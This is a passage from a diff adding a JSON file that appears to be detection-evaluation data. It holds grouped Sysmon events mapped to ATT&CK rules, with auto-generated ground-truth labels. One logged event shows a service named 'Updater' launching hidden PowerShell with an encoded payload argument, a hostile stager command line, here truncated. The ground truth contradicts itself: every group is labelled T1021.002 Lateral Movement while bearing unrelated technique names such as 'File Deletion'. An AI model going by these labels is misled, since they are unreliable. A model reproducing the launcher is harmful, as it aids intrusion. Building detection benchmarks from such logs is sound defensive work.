+        "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:16:45.876000+00:00"
+      },
+      "num_events": 177,
+      "event_id_distribution": {
+        "12": 84,
+        "7": 75,
+        "13": 6,
+        "1": 5,
+        "11": 5,
+        "23": 1,
+        "5": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 362,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:39.626000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "\"C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe\" /frequentupdate SCHEDULEDTASK displaylevel=False",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 365,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:39.628000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}"
+        },
+        {
+          "idx": 366,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:39.628000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}\\DynamicInfo"
+        },
+        {
+          "idx": 367,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.629000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 368,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.629000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 369,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.630000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 370,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.631000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 371,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.631000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 372,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.631000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 373,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.633000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 374,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.634000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 375,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.635000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 376,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.636000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 377,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.636000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 378,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.636000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "File Deletion",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:no-kw,rule!=fam(T1070.004)"
+    },
+    {
+      "group_id": "T1070_004_1673",
+      "rule_technique_id": "T1070.004",
+      "rule_technique_name": "File Deletion",
+      "confidence": 0.5,
+      "anchor": {
+        "idx": 1673,
+        "EventID": 23,
+        "Image": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:17:01.477000+00:00"
+      },
+      "num_events": 467,
+      "event_id_distribution": {
+        "12": 264,
+        "7": 177,
+        "13": 8,
+        "1": 5,
+        "5": 2,
+        "3": 2,
+        "11": 2,
+        "23": 2,
+        "17": 2,
+        "22": 1,
+        "18": 1,
+        "10": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 1046,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.108000+00:00",
+          "Image": "C:\\Windows\\System32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1047,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:57.109000+00:00",
+          "Image": "C:\\windows\\system32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Updater"
+        },
+        {
+          "idx": 1048,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.109000+00:00",
+          "Image": "C:\\Windows\\System32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1049,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.109000+00:00",
+          "Image": "C:\\Windows\\System32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1050,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:57.110000+00:00",
+          "Image": "C:\\windows\\system32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Updater\\Start"
+        },
+        {
+          "idx": 1051,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:57.110000+00:00",
+          "Image": "C:\\windows\\system32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Updater\\Type"
+        },
+        {
+          "idx": 1052,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:57.111000+00:00",
+          "Image": "C:\\windows\\system32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Updater\\ErrorControl"
+        },
+        {
+          "idx": 1053,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:57.112000+00:00",
+          "Image": "C:\\windows\\system32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Updater\\ImagePath"
+        },
+        {
+          "idx": 1054,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:57.113000+00:00",
+          "Image": "C:\\windows\\system32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Updater\\DisplayName"
+        },
+        {
+          "idx": 1055,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:57.113000+00:00",
+          "Image": "C:\\windows\\system32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Updater\\ObjectName"
+        },
+        {
+          "idx": 1056,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:57.114000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqA",
+          "ParentImage": "C:\\Windows\\System32\\services.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1059,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.116000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1063,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.119000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1066,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.120000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1065,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.120000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "File Deletion",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1070_004_3781",
+      "rule_technique_id": "T1070.004",
+      "rule_technique_name": "File Deletion",
+      "confidence": 0.0,
+      "anchor": {
+        "idx": 3781,
+        "EventID": 23,
+        "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:18:00.004000+00:00"
+      },
+      "num_events": 3,
+      "event_id_distribution": {
+        "13": 2,
+        "23": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 3631,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:17:58.900000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\NdisCap\\Parameters\\RefCount"
+        },
+        {
+          "idx": 3633,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:17:58.901000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\.DEFAULT\\System\\CurrentControlSet\\Control\\NetTrace\\Session\\CaptureEnabled"
+        },
+        {
+          "idx": 3781,
+          "EventID": 23,
+          "TimeCreated": "2020-09-20 16:18:00.004000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "File Deletion",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:c=0,no-kw,rule!=fam(T1070.004)"
+    },
+    {
+      "group_id": "T1070_004_3994",
+      "rule_technique_id": "T1070.004",
+      "rule_technique_name": "File Deletion",
+      "confidence": 0.0,
+      "anchor": {
+        "idx": 3994,
+        "EventID": 23,
+        "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:18:02.139000+00:00"
+      },
+      "num_events": 3,
+      "event_id_distribution": {
+        "13": 2,
+        "23": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 3866,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:18:02.069000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\NdisCap\\Parameters\\RefCount"
+        },
+        {
+          "idx": 3867,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:18:02.070000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\.DEFAULT\\System\\CurrentControlSet\\Control\\NetTrace\\Session\\CaptureEnabled"
+        },
+        {
+          "idx": 3994,
+          "EventID": 23,
+          "TimeCreated": "2020-09-20 16:18:02.139000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "File Deletion",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:c=0,no-kw,rule!=fam(T1070.004)"
+    },
+    {
+      "group_id": "T1071_001_2512",
+      "rule_technique_id": "T1071.001",
+      "rule_technique_name": "Web Protocols",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 2512,
+        "EventID": 3,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:17:04.029000+00:00"
+      },
+      "num_events": 707,
+      "event_id_distribution": {
+        "12": 338,
+        "7": 252,
+        "13": 74,
+        "5158": 15,
+        "5156": 9,
+        "1": 4,
+        "3": 4,
+        "5": 2,
+        "11": 2,
+        "23": 2,
+        "17": 2,
+        "22": 1,
+        "18": 1,
+        "10": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 871,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.942000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Office\\Common"
+        },
+        {
+          "idx": 872,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.942000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Office\\Common"
+        },
+        {
+          "idx": 873,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.942000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Office\\Common"
+        },
+        {
+          "idx": 874,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.944000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Office\\Common"
+        },
+        {
+          "idx": 877,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.945000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Office\\Common"
+        },
+        {
+          "idx": 878,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.945000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Office\\Common"
+        },
+        {
+          "idx": 879,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.945000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Office\\Common"
+        },
+        {
+          "idx": 881,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.947000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}"
+        },
+        {
+          "idx": 883,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:54.948000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}\\DynamicInfo"
+        },
+        {
+          "idx": 884,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:54.948000+00:00",
+          "Image": "C:\\windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Notifications\\Data\\418A073AA3BC1C75"
+        },
+        {
+          "idx": 888,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.950000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\ServiceInstances\\b0a138b2-8bdc-40b3-8379-ee4cae72d01e"
+        },
+        {
+          "idx": 889,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:54.951000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\ServiceInstances"
+        },
+        {
+          "idx": 1046,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.108000+00:00",
+          "Image": "C:\\Windows\\System32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1047,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:57.109000+00:00",
+          "Image": "C:\\windows\\system32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Updater"
+        },
+        {
+          "idx": 1048,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.109000+00:00",
+          "Image": "C:\\Windows\\System32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Web Protocols",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1071_001_2637",
+      "rule_technique_id": "T1071.001",
+      "rule_technique_name": "Web Protocols",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 2637,
+        "EventID": 3,
+        "Image": "C:\\Program Files (x86)\\Microsoft\\Microsoft Search in Bing\\MicrosoftSearchInBing.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:17:06.088000+00:00"
+      },
+      "num_events": 50,
+      "event_id_distribution": {
+        "12": 15,
+        "5158": 12,
+        "5156": 10,
+        "7": 6,
+        "3": 4,
+        "13": 2,
+        "22": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 963,
+          "EventID": 5158,
+          "TimeCreated": "2020-09-20 16:16:57.042000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 967,
+          "EventID": 5156,
+          "TimeCreated": "2020-09-20 16:16:57.045000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1107,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:57.147000+00:00",
+          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-4228717743-1032521047-1810997296-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"
+        },
+        {
+          "idx": 1109,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.148000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1110,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.149000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1113,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.150000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1118,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:57.154000+00:00",
+          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-4228717743-1032521047-1810997296-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"
+        },
+        {
+          "idx": 1130,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:57.160000+00:00",
+          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
+        },
+        {
+          "idx": 1132,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:57.162000+00:00",
+          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
+        },
+        {
+          "idx": 1134,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:57.163000+00:00",
+          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
+        },
+        {
+          "idx": 1136,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:57.163000+00:00",
+          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
+        },
+        {
+          "idx": 1138,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.165000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1140,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.166000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1221,
+          "EventID": 5158,
+          "TimeCreated": "2020-09-20 16:16:58.219000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1222,
+          "EventID": 5158,
+          "TimeCreated": "2020-09-20 16:16:58.220000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Web Protocols",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: sample-kw+ctx(T1071.001,c=1.00)"
+    },
+    {
+      "group_id": "T1112_3631",
+      "rule_technique_id": "T1112",
+      "rule_technique_name": "Modify Registry",
+      "confidence": 0.0,
+      "anchor": {
+        "idx": 3631,
+        "EventID": 13,
+        "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:17:58.900000+00:00"
+      },
+      "num_events": 3,
+      "event_id_distribution": {
+        "13": 2,
+        "23": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 3631,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:17:58.900000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\NdisCap\\Parameters\\RefCount"
+        },
+        {
+          "idx": 3633,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:17:58.901000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\.DEFAULT\\System\\CurrentControlSet\\Control\\NetTrace\\Session\\CaptureEnabled"
+        },
+        {
+          "idx": 3781,
+          "EventID": 23,
+          "TimeCreated": "2020-09-20 16:18:00.004000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Modify Registry",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:c=0,no-kw,rule!=fam(T1112)"
+    },
+    {
+      "group_id": "T1112_3866",
+      "rule_technique_id": "T1112",
+      "rule_technique_name": "Modify Registry",
+      "confidence": 0.0,
+      "anchor": {
+        "idx": 3866,
+        "EventID": 13,
